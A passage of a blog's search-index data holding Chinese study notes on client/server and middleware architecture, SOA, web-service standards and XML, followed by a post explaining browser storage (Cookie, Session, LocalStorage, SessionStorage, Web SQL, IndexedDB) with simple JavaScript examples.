class=\"headerlink\" title=\"两层：客户端/服务器（C/S）\"></a>两层：客户端/服务器（C/S）</h3><p>因为计算机变得更加强大，所有得意吧表示层移到客户端，这样做的优点：</p>\n<ul>\n<li>客户端之间相互独立，一个客户端可以有不同的表示层，取决于每个客户端要做什么</li>\n<li>客户端分担了计算力，且可以带来多个表示层。同时也节省了客户端的资源</li>\n<li>这引入了API的概念，一个从外部调用系统的接口，这让设计者们想到可以把多个系统统一为一个整体</li>\n<li>资源管理器只看得见一个客户：应用逻辑层，因为没有必要维护客户链接，性能得以很大提升。<br><img src=\"Screenshot_20181118_172008.png\" alt=\"\"></li>\n</ul>\n<p>从一层架构到两层架构的转变带来了明显的技术优势：</p>\n<ul>\n<li>利用了客户端的容优势量，把工作交给客户端做</li>\n<li>服务器设计依然是紧耦合的，并却可以通过无视表示层的问题来优化</li>\n<li>从软件工程的角度上来说依然比较容易管理和控制</li>\n</ul>\n<p>然而，两层系统也有缺点：</p>\n<ul>\n<li>服务器必须处理所有可能的客户端连接，最大的客户端数目取决于服务器支持的连接数量</li>\n<li>因为没有一个标准的表示层，客户端被绑在了服务器上，一个人要使用两个系统，客户端就需要两个表示层</li>\n<li>没有错误和夹在封装，一旦服务器崩溃，所有人都不能使用。类似的，一个客户端创造的计算负载会被直接影响他人，因为他们都在竞争用一个资源</li>\n</ul>\n<p>C/S的局限性：如果客户端需要接入多个服务器，2层结构可能带来的问题：</p>\n<ul>\n<li>处理异质系统的责任变成了客户端的</li>\n<li>没有共同的业务逻辑</li>\n<li>底层系统互不知晓</li>\n<li>客户端需要知道东西在那，如何得到他们，如何确保完整性</li>\n</ul>\n<h3 id=\"三层：中间件-MiddleWare\"><a href=\"#三层：中间件-MiddleWare\" class=\"headerlink\" title=\"三层：中间件(MiddleWare)\"></a>三层：中间件(MiddleWare)</h3><p>三层结构中，三层完全分开了。中间件是客户端和其他层之间的一个间接层。他引入了一个额外的包含了所有底层系统的业务逻辑层。<br><img src=\"Screenshot_20181118_172110.png\" alt=\"\"></p>\n<p>一个中间件通过这样：</p>\n<ul>\n<li>通过减少接口数量减少了客户端的复杂度</li>\n<li>提供了访问底层系统不同的方法</li>\n<li>成为了内部系统功能和高级应用的平台，且保护本地数据，访问他们，和搜集结果<br><img src=\"Screenshot_20181118_172146.png\" alt=\"\"></li>\n</ul>\n<p>中间件的引入带来了如下的好处：</p>\n<ul>\n<li>大规模减少了所需接口的数量，客户端只能看到中间件，本地系统也只能看到中间件</li>\n<li>他让控制中心化了</li>\n<li>他让所有的客户都能访问到必须的功能</li>\n<li>然一些原本很难实现的功能得以实现</li>\n</ul>\n<p><strong>中间件本身就是一个系统！他也可以分一层,两层,三层….</strong></p>\n<h2 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h2><p>组件就是包含了特定接口的一个单位，组件的大小各不相同，上到一个学生注册系统，下到一个按钮，都是组件</p>\n<p>组件的特点：</p>\n<ul>\n<li>规格—描述做什么，如何使用这个组件，如何调用它，如何交互</li>\n<li>实现—关于如何做，如何实现</li>\n</ul>\n<p>组件的优点：</p>\n<ul>\n<li>效率高</li>\n<li>使得不同应用之间可以交互</li>\n<li>易于维护</li>\n</ul>\n<h2 id=\"web服务\"><a href=\"#web服务\" class=\"headerlink\" title=\"web服务\"></a>web服务</h2><p>web服务是一个提供服务的可编程的组件，可以通过互联网访问</p>\n<h2 id=\"样例学习\"><a href=\"#样例学习\" class=\"headerlink\" title=\"样例学习\"></a>样例学习</h2><p>面向服务的编程：软件不需要被提前安装(web)，服务按需启动，不同设备互联，即插即用，不需要用户安装设备驱动程序。</p>\n<h1 id=\"web服务导论\"><a href=\"#web服务导论\" class=\"headerlink\" title=\"web服务导论\"></a>web服务导论</h1><h2 id=\"作为服务的软件\"><a href=\"#作为服务的软件\" class=\"headerlink\" title=\"作为服务的软件\"></a>作为服务的软件</h2><p>作为代码的软件：开发 -&gt; 测试 -&gt; 发布 -&gt; 安装 -&gt; 操作<br>作为服务的软件：开发 -&gt; 测试 -&gt; 操作(通过互联网服务) 用户的操作可以增强服务</p>\n<h2 id=\"SOC-amp-SOA概述\"><a href=\"#SOC-amp-SOA概述\" class=\"headerlink\" title=\"SOC &amp; SOA概述\"></a>SOC &amp; SOA概述</h2><h3 id=\"IT的本质\"><a href=\"#IT的本质\" class=\"headerlink\" title=\"IT的本质\"></a>IT的本质</h3><p>IT:Information Technolog 信息技术<br>在IT的本质中有两种使用信息的方法：</p>\n<ul>\n<li>创造信息</li>\n<li>访问信息</li>\n</ul>\n<p>创造信息</p>\n<ul>\n<li>在商业活动中，比如：接受订购，购买材料，大量的信息被生成</li>\n<li>需要把这些信息收集到一起。比如，当收到一个订购信息需要记录顾客的信息，产品的信息，以此来运输和支付</li>\n</ul>\n<p>调用信息</p>\n<ul>\n<li>根据上面的例子，在收到订购之后，在运输前，产品会被找到并包装。之后，在运输的过程中，需要根据订购的信息找到客户的地址信息。</li>\n<li>找到客户的地址信息的功能就是一个调用</li>\n</ul>\n<p>IT的改良：整合信息</p>\n<ul>\n<li>整合信息是为了更好的利用信息</li>\n<li>比如，对收到的订购信息和销售信息的整合，可以被用来给企业制定生产计划。</li>\n</ul>\n<p>紧耦合</p>\n<ul>\n<li>数据和功能通常被放置在不止一个系统上</li>\n<li>应用之间需要能够“相互交谈”</li>\n<li>现状：专用或定制应用间通讯用的接口</li>\n</ul>\n<p>紧耦合面临的挑战</p>\n<ul>\n<li>紧耦合面临的挑战<ul>\n<li>维护起来代价很大</li>\n<li>缓慢并且改变的代价很大</li>\n<li>结果：花费巨大，维护复杂，改变一个紧耦合的系统让商业事务难以灵活</li>\n</ul>\n</li>\n<li>不支持复用：复用是一个业界多年都想解决的问题</li>\n<li>复用的解决方案的变化过程反映了整个产业的焦点：<ul>\n<li>头文件，对象层的继承和多态，框架</li>\n<li>CORBA(Common Object Request Broker Architecture) </li>\n<li>Microsoft COM(Component Object Model) </li>\n<li>EAI(Enterprise Application Integration )</li>\n<li>Web Services</li>\n</ul>\n</li>\n</ul>\n<p>以应用为中心 VS 以服务为中心（ppt 14 16）</p>\n<h3 id=\"面向服务架构-SOA\"><a href=\"#面向服务架构-SOA\" class=\"headerlink\" title=\"面向服务架构(SOA)\"></a>面向服务架构(SOA)</h3><p>Service Oriented Architecture(SOA)</p>\n<p>SOA是一个软件架构模型</p>\n<ul>\n<li>在模型中，软件是基于标准协议的服务<ul>\n<li>代表一种高级不商务概念</li>\n<li>可以被重用创造新的商务应用</li>\n<li>可以通过网络分布式</li>\n</ul>\n</li>\n<li>SOA内部使用的通信基础设施应设计为独立于底层协议层</li>\n</ul>\n<p>SOA是有关构建松耦合的，可重用的与应用程序无关的业务服务的准则。</p>\n<p>服务是自主，离散和可重复使用的业务功能单元,以合同形式披露其能力。即使在运行时，服务也可以独立进化，移动，扩展</p>\n<p>SOA是一组相互通信的服务。通信包括服务提供者和消费者之间简单数据传送。</p>\n<p>注意！</p>\n<ul>\n<li>SOA是一个设计理念和架构，而不是一种技术和方法</li>\n<li>SOA是一个解决方案，而不是一个具体产品</li>\n<li>SOA通过web服务和相关的技术获得，而不只是web服务</li>\n</ul>\n<p>主要的服务类型</p>\n<ul>\n<li>基础服务<ul>\n<li>以数据为中心和以逻辑为中心的服务</li>\n<li>封装数据行为和数据模型并确保数据一致性。</li>\n<li>基本服务是无状态的，有着高度的可重用性</li>\n</ul>\n</li>\n<li>复合服务<ul>\n<li>封装特定于业务的工作流程或精心策划的服务。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"SOA关键技术\"><a href=\"#SOA关键技术\" class=\"headerlink\" title=\"SOA关键技术\"></a>SOA关键技术</h2><p>SOA的准则：</p>\n<ul>\n<li>自描述<ul>\n<li>SOA服务接口描述，暴露，并提供一个“切入点”服务。界面包含所有服务消费者需要的信息发现并连接到服务，没有要求消费者理解（甚至看到）技术实施细节。</li>\n</ul>\n</li>\n<li>松耦合(调用者和服务端不需要紧耦合)<ul>\n<li>松散耦合允许将应用程序功能的关注点分离成独立的部分。这种“分散的关注”提供一种不需要紧绑定就能来调用另一种服务的机制。</li>\n<li>在服务边界内外创建特定类型的关系一直强调减少（“松散”）之间的依赖关系<ul>\n<li>服务合同 </li>\n<li>服务实施 </li>\n<li>服务消费者</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>抽象(只传送另一方必要的信息)<ul>\n<li>服务归约只包含基本的信息和的服务规约中发布的信息</li>\n<li>避免以不必要的服务信息，元信息作为开端</li>\n<li>尽可能隐藏服务的底层细节</li>\n</ul>\n</li>\n<li>可重用<ul>\n<li>“服务包含和表达不可知的逻辑，可以定位为可重用的企业资源。”</li>\n<li>可重复使用的服务有以下特征： <ul>\n<li>由不可知的功能上下文定义 </li>\n<li>逻辑高度通用 </li>\n<li>具有通用和可扩展的合同</li>\n<li>可以并发访问</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>自主<ul>\n<li>“服务对它们的底层运行时执行环境控制力很高。”</li>\n<li>表示服务逻辑独立于外部影响执行服务的能力</li>\n<li>要实现这一目标，服务必须更加孤立</li>\n<li>主要益处：提高可靠性，行为可预测性</li>\n</ul>\n</li>\n<li>无状态<ul>\n<li>SOA服务不会记住上次次他们干了什么，也不会在意下一次是什么。服务不取决于其他服务的上下文。</li>\n<li>在服务设计中合并州管理延期扩展</li>\n<li>目标 <ul>\n<li>提高服务可扩展性 </li>\n<li>支持不可知的设计逻辑和改善服务重用</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>可被发现性<ul>\n<li>服务必须是可发现的，不然他们不可能被调用</li>\n<li>服务合同包含用于发现的适当元数据，其还向人类传达目的和能力</li>\n<li>将元数据存储在服务注册表或配置文件中</li>\n</ul>\n</li>\n<li>可组合性<ul>\n<li>SOA服务本质上是复合的。它们可以由其他服务组成 - 反过来，可以与其他服务组合以组成新的业务解决方案。组合通常通过编排来实现，使用实现诸如BPEL4WS之类的标准的工具</li>\n<li>确保服务能够参与多个组合以解决多个更大的问题</li>\n<li>与可重用性原则相关</li>\n<li>服务执行应该高效，因为应该高度调整单个处理</li>\n<li>灵活的服务合同，允许对类似功能的不同类型的数据交换要求</li>\n</ul>\n</li>\n</ul>\n<p>实现SOA的步骤：</p>\n<ul>\n<li>创建/公开服务</li>\n<li>注册服务</li>\n<li>安全服务</li>\n<li>管理（监控）服务</li>\n<li>调解和虚拟化服务</li>\n<li>管理SOA</li>\n</ul>\n<p>SOA的好处:</p>\n<ul>\n<li>提供位置独立性：服务无需与特定网络上的特定系统相关联</li>\n<li>独立于协议的通信框架使代码可重用</li>\n<li>为不断变化的业务需求提供更好的适应性和更快的响应速度</li>\n<li>允许更轻松的应用程序开发，运行时部署和更好的服务管理</li>\n<li>松散耦合的系统架构允许通过组合应用程序，流程或来自其他不太复杂的服务的更复杂服务轻松集成</li>\n<li>通过服务接口而不是紧密耦合的机制提供服务使用者的身份验证和授权，以及所有安全功能</li>\n<li>允许服务使用者（例如Web服务）动态查找和连接可用服务</li>\n</ul>\n<h2 id=\"web服务模型\"><a href=\"#web服务模型\" class=\"headerlink\" title=\"web服务模型\"></a>web服务模型</h2><p>Web服务栈：<br><img src=\"Screenshot_20181121_142219.png\" alt=\"\"></p>\n<h3 id=\"服务和信息层-Service-amp-Information-Layer\"><a href=\"#服务和信息层-Service-amp-Information-Layer\" class=\"headerlink\" title=\"服务和信息层(Service &amp; Information Layer)\"></a>服务和信息层(Service &amp; Information Layer)</h3><p><img src=\"Screenshot_20181121_140830.png\" alt=\"\"></p>\n<p>使用WSDL：</p>\n<ol>\n<li>描述服务可以支持的消息交换格式</li>\n<li>WSDL可以定义服务可用的位置以及用于与服务通信的通信协议。</li>\n<li>作为扩展IDL：WSDL允许工具生成兼容的客户端和服务器存根。</li>\n<li>允许行业定义标准化服务接口。</li>\n<li>允许广告服务描述，启用动态发现和兼容服务的绑定。</li>\n<li>提供异构应用程序的规范化描述。</li>\n</ol>\n<p>WSDL文档（PPT64）</p>\n<p>XML语言<br>在web服务中，一个信息是一个XML文当中定义的一个item,所有web服务的技术都基于XML来通信，描述，注册。因为XML是文本文档，没有二进制数据，应用可以直接读XML，所有应用都用XML，所以应用之间可以相互通信。使用XML的应用可以平台无关，XML可以吧结构化的数据存入文本文件</p>\n<h3 id=\"打包层-Packaging-Layer\"><a href=\"#打包层-Packaging-Layer\" class=\"headerlink\" title=\"打包层(Packaging Layer)\"></a>打包层(Packaging Layer)</h3><ul>\n<li>Simple Object Access Protocol (SOAP)是一个轻量级的协议，被设计来使用XML交换信息</li>\n<li>定义模块化包装模型和编码的编码机制模块内的数据</li>\n</ul>\n<h3 id=\"协议层-Protocol-Layer\"><a href=\"#协议层-Protocol-Layer\" class=\"headerlink\" title=\"协议层(Protocol Layer)\"></a>协议层(Protocol Layer)</h3><ul>\n<li>任何标准的网络协议都可能被用来通过网络调用网络服务</li>\n<li>初始定义专注于HTTP / 1.1和加密的HTTPS</li>\n<li>FTP和SMTP协议也可能被使用</li>\n</ul>\n<h3 id=\"发现层-Discovery-Layer\"><a href=\"#发现层-Discovery-Layer\" class=\"headerlink\" title=\"发现层(Discovery Layer)\"></a>发现层(Discovery Layer)</h3><ul>\n<li>通用描述，发现和集成协议（UDDI）指定用于查询和更新Web服务信息的公共目录的协议。- 可以使用UDDI目录方法当Web服务信息存储在众所周知的位置。 </li>\n<li>UDDI提供查询和发布API</li>\n<li>Microsoft，IBM和SAP托管UDDI业务注册。</li>\n<li>目录条目有三个主要部分 - 服务提供者，提供的Web服务和绑定到实现。</li>\n<li>动态发现的Web服务明确宣布其到达和离开网络。</li>\n</ul>\n<h3 id=\"Web服务优点和缺点\"><a href=\"#Web服务优点和缺点\" class=\"headerlink\" title=\"Web服务优点和缺点\"></a>Web服务优点和缺点</h3><p>优点：</p>\n<ul>\n<li>Web服务提供互操作性运行各种软件应用程序之间在不同的平台/操作系统上 </li>\n<li>Web服务使用开放标准和协议 </li>\n<li>通过利用HTTP，Web服务可以通过许多常见的防火墙安全工作，而无需改变防火墙过滤规则。 </li>\n<li>Web服务允许软件和服务来自不同的公司和地点，结合轻松提供一体化服务。</li>\n<li>Web服务允许重用服务和基础设施内的组件。 </li>\n<li>Web服务由此松散耦合促进分布式</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>管理和跟踪变化是一个挑战</li>\n<li>事务不完全解决</li>\n<li>多种不断发展的安全性标准</li>\n<li>处理开销</li>\n</ul>\n<h3 id=\"未来的愿景和挑战\"><a href=\"#未来的愿景和挑战\" class=\"headerlink\" title=\"未来的愿景和挑战\"></a>未来的愿景和挑战</h3><p>未来愿景：</p>\n<ul>\n<li>技术供应商计划开发，营销和销售借助在线Web服务来实现几乎任何业务功能。 </li>\n<li>公司将能够简单地搜索应用程序的公共目录并下载符合其需求的应用程序。</li>\n</ul>\n<p>挑战：</p>\n<ul>\n<li>供应商如何提供端到端安全性？ </li>\n<li>当供应商未能交付时，谁负责承诺的服务？ </li>\n<li>供应商如何保证可用性和可靠性？</li>\n<li>供应商如何处理定价？</li>\n</ul>\n<h1 id=\"XML基础\"><a href=\"#XML基础\" class=\"headerlink\" title=\"XML基础\"></a>XML基础</h1><h2 id=\"XML简介\"><a href=\"#XML简介\" class=\"headerlink\" title=\"XML简介\"></a>XML简介</h2><p>XML：eXtensible Markup Language（可扩展的标记语言）</p>\n<ul>\n<li>XML是一种含有结构化信息的标记预言</li>\n<li>XML是一种元标记(meta-markup)语言<ul>\n<li>标签可以按需要扩展</li>\n</ul>\n</li>\n<li>XML可以自己描述自己的结构和语法</li>\n<li>XML简单容易理解，而且平台无关，XML只和数据相关但是不用管如何展示，如何显示由其他语言决定，eg.CSS &amp; XSL</li>\n<li>当XML分发给客户端，客户端可以用软件获取数据并修改，HTML只是被用来显示数据</li>\n<li>部分工作(解析)由客户端来做，这样降低了服务器的工作负担</li>\n</ul>\n<h2 id=\"XML结构\"><a href=\"#XML结构\" class=\"headerlink\" title=\"XML结构\"></a>XML结构</h2><ul>\n<li>声明：版本包</li>\n<li>注解</li>\n<li>主体正文：含有元素<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- notation --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">myMessage</span>&gt;</span></span><br><span class=\"line\">    welcome</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">myMessage</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">DTD:文档类型描述：  </span><br><span class=\"line\">```xml</span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=“1.0” ?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">book</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">book</span> (<span class=\"meta-keyword\">price</span>, <span class=\"meta-keyword\">name</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">name</span> (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">price</span> (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">book</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">price</span>&gt;</span>33<span class=\"tag\">&lt;/<span class=\"name\">price</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>xml Technology<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">book</span>&gt;</span></span><br></pre></td></tr></table></figure>\nDTD可以写为本地定义，也可以写在文件里作为外部定义</li>\n</ul>\n<p>XML不等同html，标签必须有开始和结束：<br>html下可以<code>&lt;br&gt;</code>，但xml下必须<code>&lt;br&gt;&lt;/br&gt;</code>或者<code>&lt;br/&gt;</code></p>\n<p>XML下内容要使用保留的关键字，则需要使用对应的转译符<br><strong>语法见PPT</strong></p>\n<h1 id=\"web服务标准\"><a href=\"#web服务标准\" class=\"headerlink\" title=\"web服务标准\"></a>web服务标准</h1><h2 id=\"SOAP\"><a href=\"#SOAP\" class=\"headerlink\" title=\"SOAP\"></a>SOAP</h2><p>Simple Object Access Protocol简单对象访问协议<br>W3C标准下基于XML和HTTP的轻量级的复杂分布式对象技术的替代品</p>\n<h1 id=\"服务构成\"><a href=\"#服务构成\" class=\"headerlink\" title=\"服务构成\"></a>服务构成</h1><p>intergration 整合<br>go over重温<br>homogeneous同质<br>tie 等级<br>monolithic 单片的<br>sophisticated 复杂的</p>\n<p>chapter 1 考点：自顶向下 自xxx 的用例范围情况 实用性</p>\n","tags":["分布式"]},{"title":"前端中的几类存储","url":"/2021/04/23/%E5%89%8D%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AD%98%E5%82%A8/","content":"<p>由于HTTP的无状态性，Web开发中最基本的维护页面状态的手段就是Cookie和Session，其中Cookie存在前端，Session存在后端。</p>\n<p>Chrome开发者工具的Application中除了Cookie之外还有其他几种存储：<br><img src=\"1.png\" alt=\"\"></p>\n<ul>\n<li>LocalStorage</li>\n<li>SessionStorage</li>\n<li>IndexedDB</li>\n<li>Web SQL</li>\n</ul>\n<span id=\"more\"></span>\n<h2 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h2><p>Cookie存储在浏览器本地，每个域对应同一个Cookie。Cookie可以由前端用<code>document.cookie</code>对象获得：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">document</span>.cookie) <span class=\"comment\">// &quot;id:114514&quot;</span></span><br></pre></td></tr></table></figure><br>给<code>document.cookie</code>赋值可以<strong>新增或修改</strong>本域下已有的Cookie：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.cookie = <span class=\"string\">&quot;role: vip&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">document</span>.cookie) <span class=\"comment\">// &quot;id:114514; role:vip&quot;</span></span><br></pre></td></tr></table></figure><br>请求本域的资源的时候HTTP头部会带上Cookie字段：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: role:vip; id:114514</span><br></pre></td></tr></table></figure><br><img src=\"2.png\" alt=\"\"></p>\n<blockquote>\n<p>前端设置的Cookie不带有过期时间，不带有过期时间的Cookie叫做会话Cookie，会话Cookie存储在内存中，在关闭当前页面的适合消失。带有过期时间的Cookie会持久化存储直到过期。</p>\n</blockquote>\n<p>由于Cookie会在每次清求都写在Header里，当Cookie数据量过大就会影响HTTP传输的性能。加上Cookie允许的数据量存在上限，就需配合Session使用。</p>\n<h2 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h2><p>Session的数据是存储在后端的，Session是基于Cookie来实现的。前端仍然需要存储Cookie，Cookie中不再存放具体的数据，而是一个SESSIONID，如PHP实现的框架中这个值往往是”PHPSESSIONID”，Java的Web框架中它是”JSESSIONID”。SESSIONID是一个很长的Hash串，服务器在内存中维护一个SESSIONID=&gt;Map的数据结构。当浏览器请求资源的时候，服务器获取Cookie中的SESSIONID，拿到对应的Map，再从其中读取用户信息。</p>\n<p>由于SESSION数据存在服务端内存中，它允许存储更多状态数据而不拖慢HTTP请求的性能。由于前端不能直接获取SESSION中的内容，它适合存储铭感的数据。</p>\n<blockquote>\n<p>果用户禁用cookie，则要使用URL重写，可以通过response.encodeURL(url) 进行实现</p>\n</blockquote>\n<h2 id=\"LocalStorage\"><a href=\"#LocalStorage\" class=\"headerlink\" title=\"LocalStorage\"></a>LocalStorage</h2><p>LocalStorage和Cookie一样，存储在浏览器本地，一个域对应一个LocalStorage，上限5M。与Cookie不同的是，它<strong>不会随着请求被提交</strong>。LocalStorage也表现为浏览器某个域下的一个KV数据集：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">localStorage</span>.setItem(<span class=\"string\">&quot;age&quot;</span>,<span class=\"number\">24</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">localStorage</span>.getItem(<span class=\"string\">&quot;age&quot;</span>)) <span class=\"comment\">//output: 24</span></span><br><span class=\"line\"><span class=\"built_in\">localStorage</span>.removeItem(<span class=\"string\">&quot;age&quot;</span>) <span class=\"comment\">//remove item with key &quot;age&quot;</span></span><br></pre></td></tr></table></figure><br><img src=\"3.png\" alt=\"\"></p>\n<h2 id=\"SessionStorage\"><a href=\"#SessionStorage\" class=\"headerlink\" title=\"SessionStorage\"></a>SessionStorage</h2><p>SessionStorage也和LocalStorage一样，存储在本地，每个域上限5M，且不随着请求被提交。它和LocalStorage的唯一区别是：SessionStorage不支持跨标签页，<strong>一旦标签页被关闭，这个页面会话的SessionStorage就会被清空</strong>。所以SessionStorage可以被用于无痕模式浏览。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">sessionStorage.setItem(<span class=\"string\">&quot;age&quot;</span>,<span class=\"number\">24</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(sessionStorage.getItem(<span class=\"string\">&quot;age&quot;</span>)) <span class=\"comment\">//output: 24</span></span><br><span class=\"line\">sessionStorage.removeItem(<span class=\"string\">&quot;age&quot;</span>) <span class=\"comment\">//remove item with key &quot;age&quot;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果一个标签页包含多个iframe标签且他们属于同源页面，那么他们之间是可以共享sessionStorage的</p>\n</blockquote>\n<h2 id=\"Web-SQL\"><a href=\"#Web-SQL\" class=\"headerlink\" title=\"Web SQL\"></a>Web SQL</h2><p>Web SQL是基于Sqlite的Web<strong>关系型数据库</strong>。Web SQL标准不再维护，只有少量浏览器（如Chrome）支持Web SQL。</p>\n<ul>\n<li>每个域最大5M空间</li>\n<li>支持事务</li>\n<li>异步IO</li>\n</ul>\n<p>使用<code>openDatabase()</code>创建一个名称为<code>person</code>的数据库，数据库版本为1。第三个参数是数据库的描述，最后一个参数是最大存储空间，由于Chrome中默认最大存储空间都是5M，直接给0。<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db = openDatabase(<span class=\"string\">&#x27;person&#x27;</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;this is a websql person database&#x27;</span>,<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure><br>创建一个<code>student</code>表，并插入两条数据：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.transaction(<span class=\"function\"><span class=\"params\">tx</span> =&gt;</span> &#123;</span><br><span class=\"line\">    tx.executeSql(<span class=\"string\">&quot;create table if not exists student (id unique, name)&quot;</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">db.transaction(<span class=\"function\"><span class=\"params\">tx</span> =&gt;</span> &#123;</span><br><span class=\"line\">    tx.executeSql(<span class=\"string\">&quot;insert into student (id, name) values (?,?)&quot;</span>, [<span class=\"number\">1</span>,<span class=\"string\">&quot;thankod&quot;</span>]);</span><br><span class=\"line\">    tx.executeSql(<span class=\"string\">&quot;insert into student (id, name) values (?,?)&quot;</span>, [<span class=\"number\">2</span>,<span class=\"string\">&quot;xuranus&quot;</span>]);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><br>浏览器中查看：<br><img src=\"4.png\" alt=\"\"></p>\n<p>执行查询：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.transaction(<span class=\"function\"><span class=\"params\">tx</span> =&gt;</span> &#123;</span><br><span class=\"line\">    tx.executeSql(<span class=\"string\">&quot;select * from student&quot;</span>, [], <span class=\"function\">(<span class=\"params\">tx, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> rows = res.rows;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> len = rows.length;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(rows.item(i))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><br>输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;id:1, name:&quot;thankod&quot;&#125;</span><br><span class=\"line\">&#123;id:2, name:&quot;xuranus&#125;</span><br></pre></td></tr></table></figure><br>执行删除：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.transaction(<span class=\"function\"><span class=\"params\">tx</span> =&gt;</span> &#123;</span><br><span class=\"line\">    tx.executeSql(<span class=\"string\">&quot;delete from student where id = ?&quot;</span>,[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"IndexedDB\"><a href=\"#IndexedDB\" class=\"headerlink\" title=\"IndexedDB\"></a>IndexedDB</h2><p>LocalStorage存储上限5M，而要存更多数据就要用IndexedDB。IndexedDB是浏览器本地存储的K-V数据集。具有如下特性：</p>\n<ul>\n<li>最大允许每个域50M存储（移动端25M）</li>\n<li>异步IO</li>\n<li>支持事务</li>\n<li>支持二进制数据（Blob）存储</li>\n</ul>\n<p>创建一个到数据库<code>db1</code>的连接：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> db;</span><br><span class=\"line\"><span class=\"keyword\">var</span> request = <span class=\"built_in\">window</span>.indexedDB.open(<span class=\"string\">&quot;db1&quot;</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">// bind onsuccess event</span></span><br><span class=\"line\">request.onsuccess = <span class=\"function\">(<span class=\"params\">e</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    db = request.result;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;db open success&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>新建一张<code>person</code>表，主键名称<code>id</code>：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// bind onupgradeneeded event and create</span></span><br><span class=\"line\">request.onupgradeneeded = <span class=\"function\">(<span class=\"params\">e</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    db = e.target.result;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> objectStore;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!db.objectStoreNames.contains(<span class=\"string\">&#x27;person&#x27;</span>)) &#123;</span><br><span class=\"line\">        objectStore = db.createObjectStore(<span class=\"string\">&#x27;person&#x27;</span>,&#123;<span class=\"attr\">keyPath</span>:<span class=\"string\">&#x27;id&#x27;</span>&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;table person create succeed&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>IndexedDB所有Schema变动的操作都需要绑定<code>onupgradeneeded</code>。接下来插入数据：<br><figure 